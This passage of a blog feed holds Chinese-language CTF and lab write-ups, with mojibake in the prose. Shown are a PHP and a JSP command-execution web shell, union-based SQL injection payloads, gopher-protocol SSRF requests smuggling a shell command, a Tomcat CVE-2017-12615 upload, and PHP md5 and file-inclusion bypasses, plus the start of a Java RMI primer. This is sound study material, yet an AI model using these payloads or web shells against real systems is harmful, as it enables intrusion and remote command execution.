src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf10.png" alt=""></p><p>å‘ç°æ•æ„Ÿç›®å½•ï¼š<code>phpinfo.php shell.php</code></p><p>å°è¯•è®¿é—®shell.php</p><p>å‘ç°phpä»£ç ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå› ä¸ºæ˜¯ç”¨bpå‘é€çš„è¯·æ±‚ï¼Œæ‰€ä»¥ç©ºæ ¼éœ€è¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç </p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf11.png" alt=""></p><h1 id="172-72-23-23-SQL-æ³¨å…¥"><a href="#172-72-23-23-SQL-æ³¨å…¥" class="headerlink" title="172.72.23.23 - SQL æ³¨å…¥"></a>172.72.23.23 - SQL æ³¨å…¥</h1><p>é€šè¿‡æŠ“åŒ…åˆ†æå¯çŸ¥ï¼Œå‚æ•°ä¸ºid</p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf12.png" alt=""></p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf13.png" alt=""></p><p>å°±å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥äº†<strong>ï¼ˆç©ºæ ¼éœ€è¦è¿›è¡Œä¸¤æ¬¡ç¼–ç ï¼‰</strong></p><p>é€šè¿‡ç®€å•çš„åˆ¤æ–­å‘ç°ï¼Œå…±æœ‰4ä¸ªå­—æ®µï¼Œå›æ˜¾ä½ç½®æ˜¯1ï¼Œ2ï¼Œ4</p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf14.png" alt=""></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">=</span><span class="number">172.72</span><span class="number">.23</span><span class="number">.23</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;%2520union%2520select%25201,2,3,database()--%2520// å‘ç°æ•°æ®åº“åä¸º db</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url=172.72.23.23?id=-1&#x27;</span><span class="operator">%</span><span class="number">2520</span><span class="keyword">union</span><span class="operator">%</span><span class="number">2520</span><span class="keyword">select</span><span class="operator">%</span><span class="number">25201</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(table_name)<span class="operator">%</span><span class="number">2520</span><span class="keyword">from</span><span class="operator">%</span><span class="number">2520</span>information_schema.tables<span class="operator">%</span><span class="number">2520</span><span class="keyword">where</span><span class="operator">%</span><span class="number">2520</span>table_schema<span class="operator">=</span><span class="string">&#x27;db&#x27;</span><span class="comment">--%2520// å‘ç°è¡¨å flag_is_here,users</span></span><br><span class="line"></span><br><span class="line">url<span class="operator">=</span><span class="number">172.72</span><span class="number">.23</span><span class="number">.23</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;%2520union%2520select%25201,2,3,group_concat(column_name)%2520from%2520information_schema.columns%2520where%2520table_name=&#x27;</span>flag_is_here<span class="string">&#x27;--%2520// å‘ç°å­—æ®µå content</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url=172.72.23.23?id=-1&#x27;</span><span class="operator">%</span><span class="number">2520</span><span class="keyword">union</span><span class="operator">%</span><span class="number">2520</span><span class="keyword">select</span><span class="operator">%</span><span class="number">25201</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(content)<span class="operator">%</span><span class="number">2520</span><span class="keyword">from</span><span class="operator">%</span><span class="number">2520</span>flag_is_here<span class="comment">--%2520//å‘ç°flagggctf&#123;63cafe619721609713aedbddfdf4bba0&#125;</span></span><br></pre></td></tr></table></figure><h1 id="172-72-23-24-å‘½ä»¤æ‰§è¡Œ"><a href="#172-72-23-24-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="172.72.23.24 - å‘½ä»¤æ‰§è¡Œ"></a>172.72.23.24 - å‘½ä»¤æ‰§è¡Œ</h1><p>æµ‹è¯•å‘½ä»¤æ‰§è¡Œ<br><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf15.png" alt=""></p><p>è¿™ä¸ªå‘½ä»¤æ‰§è¡Œçš„åœºæ™¯æ˜¯é€šè¿‡ POST æ–¹å¼è§¦å‘çš„ï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨ä½¿ç”¨ SSRF æ¼æ´é€šè¿‡ HTTP åè®®æ¥ä¼ é€’ POST æ•°æ®</p><p>æ‰€ä»¥éœ€è¦ä½¿ç”¨gopheråè®®æ¥è¿›è¡Œ</p><p>æ„é€ ï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 172.72.23.24</span><br><span class="line">Content-Length: 12</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">ip=127.0.0.1;id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST%20%2F%20HTTP%2F1.1%0AHost%3A%20172.72.23.24%0AContent-Length%3A%2012%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0A%0Aip%3D127.0.0.1%3Bid//ç¬¬ä¸€æ¬¡ç¼–ç æ•°æ®</span><br><span class="line"></span><br><span class="line">// å°†%0Aå…¨éƒ¨æ›¿æ¢ä¸º%0D%0A</span><br><span class="line"></span><br><span class="line">POST%20%2F%20HTTP%2F1.1%0D%0AHost%3A%20172.72.23.24%0D%0AContent-Length%3A%2012%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aip%3D127.0.0.1%3Bid//ç¬¬äºŒæ¬¡ç¼–ç æ•°æ®</span><br><span class="line"></span><br><span class="line">postä¼ å‚ï¼š</span><br><span class="line">url=gopher://172.72.23.24:80/_POST%2520%252F%2520HTTP%252F1.1%250D%250AHost%253A%2520172.72.23.24%250D%250AContent-Length%253A%252015%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Aip%253D127.0.0.1%253Bid</span><br></pre></td></tr></table></figure></p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf16.png" alt=""></p><p>æˆåŠŸå‘½ä»¤æ‰§è¡Œï¼</p><h1 id="172-72-23-26-CVE-2017-12615"><a href="#172-72-23-26-CVE-2017-12615" class="headerlink" title="172.72.23.26 - CVE-2017-12615"></a>172.72.23.26 - CVE-2017-12615</h1><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf17.png" alt=""></p><p>å‘ç°æ˜¯tomcatæœåŠ¡ï¼Œä¹Ÿæ˜¯é€šè¿‡æœç´¢çŸ¥é“äº†è¿™æ˜¯ä¸ªcveï¼ˆCVE-2017-12615ï¼‰</p><p>å‡†å¤‡å¥½jspçš„ä¸€å¥è¯æœ¨é©¬ï¼š<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(command != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        out.print(<span class="string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>ç»§ç»­æ„é€ ï¼Œé€šè¿‡gopheråè®®ä¼ è¿›å»</p><p><a href="https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/README.zh-cn.md">CVE-2017-12615)</a></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.72</span><span class="number">.23</span><span class="number">.26</span>:<span class="number">8080</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">444</span></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(command != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        out.print(<span class="string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>gopherä¼ å®Œï¼Œè¿”å›2xxè¯´æ˜æˆåŠŸå†™shellï¼š</p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf18.png" alt=""></p><p>å‘ç°å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼š<br><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf19.png" alt=""></p><h1 id="172-72-23-27"><a href="#172-72-23-27" class="headerlink" title="172.72.23.27"></a>172.72.23.27</h1>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTFåˆ·é¢˜è®°å½•</title>
      <link href="/2023/10/27/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/10/27/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="BJDCTF-2020"><a href="#BJDCTF-2020" class="headerlink" title="[BJDCTF 2020]"></a>[BJDCTF 2020]</h1><h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h2><p>æ‰“å¼€åå‘ç°æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œéšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿ï¼Œå‘ç°å¢åŠ äº†ä¸ªå‚æ•°ï¼Œç„¶åå°±åœ¨ä¹Ÿæ²¡æœ‰ç„¶åäº†ï¼ŒæŸ¥çœ‹æºç æ²¡æœ‰æ”¶è·ï¼Œå°è¯•æŠ“åŒ…ï¼Œå‘ç°hintï¼š</p><p><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></p><p><code>md5($pass,true)</code>ï¼šè¿”å›çš„æ˜¯å­—ç¬¦ä¸²çš„åŸå§‹æ•°æ®</p><p>å¾ˆæ˜æ˜¾è¿™æ˜¯ä¸€æ¡sqlè¯­å¥ï¼Œå¯ä»¥åˆ©ç”¨<code>&#39;or 1</code>è¿›è¡Œç»•è¿‡ï¼Œå‰ææ˜¯md5ä¹‹åéœ€è¦æœ‰è¿™äº›å­—ç¬¦ï¼Œçœ‹äº†å¤§ä½¬çš„wpï¼Œå‘ç°å¯ä»¥åˆ©ç”¨<code>ffifdyop</code>è¿›è¡Œç»•è¿‡ï¼ŒåŸç†å¦‚ä¸‹ï¼š</p><blockquote><p><code>ffifdyop</code> è¿™ä¸ªå­—ç¬¦ä¸²è¢« md5 å“ˆå¸Œäº†ä¹‹åä¼šå˜æˆ <code>276f722736c95d99e921722cf9ed621c</code>ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯ â€˜ <code>or &#39;6</code><br>è€Œ Mysql åˆšå¥½åˆä¼šæŠŠ hex è½¬æˆ ascii è§£é‡Šï¼Œå› æ­¤æ‹¼æ¥ä¹‹åçš„å½¢å¼æ˜¯ <code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>ï¼Œç­‰ä»·äº or ä¸€ä¸ªæ°¸çœŸå¼ï¼Œå› æ­¤ç›¸å½“äºä¸‡èƒ½å¯†ç ï¼Œå¯ä»¥ç»•è¿‡md5()å‡½æ•°ã€‚</p></blockquote><p>æäº¤åå‘é¡µé¢æœ‰è·³è½¬ï¼ŒæŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: levell14.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ç®€å•çš„æ•°ç»„ç»•è¿‡ï¼Œé€šè¿‡<code>?a[]=1&amp;b[]=2</code>GETä¼ å‚ï¼Œè·³è½¬åˆ°ä¸‹ä¸€ä¸ªé¡µé¢ï¼ˆå…¶å®å¯ä»¥ç›´æ¥è®¿é—®é‚£ä¸ªé¡µé¢çš„ï¼Œæ¯•ç«Ÿéƒ½ç»™å‡ºæ¥äº†ï¼‰</p><p>è·³è½¬åˆ°ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œå‘ç°phpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•åŒä¸Šï¼Œ<code>param1[]=1&amp;param2[]=2</code>POSTä¼ å‚ï¼Œæ‹¿åˆ°flag</p><h2 id="ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>éœ€è¦åˆ©ç”¨<code>file_get_contents</code>å°†æŒ‡å®šå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ï¼Œæ‰å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥åˆ¤æ–­ï¼Œå¯ä»¥åˆ©ç”¨<code>data</code>åè®®è¿›è¡Œç»•è¿‡</p><p>é€šè¿‡<code>data://text/plain,I have a dream</code>ä½¿å…¶æ»¡è¶³ç¬¬ä¸€ä¸ªifåˆ¤æ–­</p><p>åœ¨æ³¨é‡Šä¸­å‘ç°å­˜åœ¨æ–‡ä»¶<code>next.php</code>ï¼Œè®¿é—®åå‘ç°æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œå¯ä»¥é€šè¿‡<code>php://filter</code>ä¼ªåè®®é€šè¿‡<code>include</code>è¿›è¡Œæ–‡ä»¶åŒ…å«</p><p>ä½¿ç”¨<code>php://filter/read=convert.base64-encode/resource=next.php</code>å°†<code>next.php</code>æ–‡ä»¶å†…å®¹ç¼–ç è¾“å‡ºï¼Œè§£ç åå¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NSSCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW SQLæ³¨å…¥</title>
      <link href="/2023/08/30/CTFSHOW%20SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/08/30/CTFSHOW%20SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h1>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java RMI</title>
      <link href="/2023/08/17/Java%20RMI/"/>
      <url>/2023/08/17/Java%20RMI/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>RMI (Java Remote Method Invocation) Java è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œæ˜¯ä¸€ç§å…è®¸ä¸€ä¸ª JVM ä¸Šçš„ object è°ƒç”¨å¦ä¸€ä¸ª JVM ä¸Š object æ–¹æ³•çš„æœºåˆ¶</p><p>RMI å¯ä»¥ä½¿ç”¨ä»¥ä¸‹åè®®å®ç°ï¼š</p><ul><li>Java Remote Method Protocol (JRMP)ï¼šä¸“é—¨ä¸º RMI è®¾è®¡çš„åè®®</li><li>Internet Inter-ORB Protocol (IIOP) ï¼šåŸºäº <code>CORBA</code> å®ç°çš„è·¨è¯­è¨€åè®®</li></ul><p>RMI ç¨‹åºé€šå¸¸åŒ…æ‹¬</p><ul><li><code>rmi registry</code> naming serviceï¼Œæä¾› remote object æ³¨å†Œï¼Œname åˆ° remote object çš„ç»‘å®šå’ŒæŸ¥è¯¢ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„ remote object</li><li><code>rmi server</code> åˆ›å»º remote objectï¼Œå°†å…¶æ³¨å†Œåˆ° RMI registry</li><li><code>rmi client</code> é€šè¿‡ name å‘ RMI registry è·å– remote object reference (stub)ï¼Œè°ƒç”¨å…¶æ–¹æ³•</li></ul><p>å®˜æ–¹æ–‡æ¡£ä¸­çš„å›¾ä¾‹</p><p><img src="/img/Java-RMI/rmi.gif" alt=""></p><p>é€šå¸¸ RMI server å’Œ registry è¿è¡Œåœ¨åŒä¸€ä¸ª host çš„ä¸åŒç«¯å£ä¸Š</p><blockquote><p>RMI Registry é»˜è®¤è¿è¡Œåœ¨ 1099 ç«¯å£ä¸Š</p><p>RMI URL <code>rmi://hostname:port/remoteObjectName</code></p></blockquote><p>å…·ä½“å‚è€ƒï¼š<a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">RMI Overview</a></p><h1 id="ä¸€ä¸ªç®€å•çš„RMI"><a href="#ä¸€ä¸ªç®€å•çš„RMI" class="headerlink" title="ä¸€ä¸ªç®€å•çš„RMI"></a>ä¸€ä¸ªç®€å•çš„RMI</h1><p><strong>åœ¨å®¢æˆ·ç«¯ä¸­åˆ›å»ºå¦‚ä¸‹ä»£ç ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaRMI.Client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> RMI.Server.IRemoteObj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        RMI.Server.<span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        remoteObj.sayHello(<span class="string">&quot;Hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaRMI.Client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title 